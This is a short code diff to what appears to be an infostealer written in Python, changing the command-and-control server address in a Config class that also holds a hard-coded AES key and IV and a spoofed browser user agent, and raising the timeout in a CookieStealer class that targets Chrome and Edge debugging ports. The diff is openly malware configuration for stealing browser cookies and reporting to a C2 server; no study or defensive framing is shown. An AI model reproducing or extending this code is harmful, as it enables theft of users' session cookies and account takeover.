@@ -97,7 +97,7 @@ except ImportError as e:
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://192.168.16.78"
+        self.C2_SERVER = "https://10.10.8.3"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -173,7 +173,7 @@ class CookieStealer:
         self.logger = logger or self._create_default_logger()
         self.chrome_debug_port = 9222
         self.edge_debug_port = 9223
-        self.timeout = 10
+        self.timeout = 20
         self.unique_domains = set()
         
         # Browser configurations
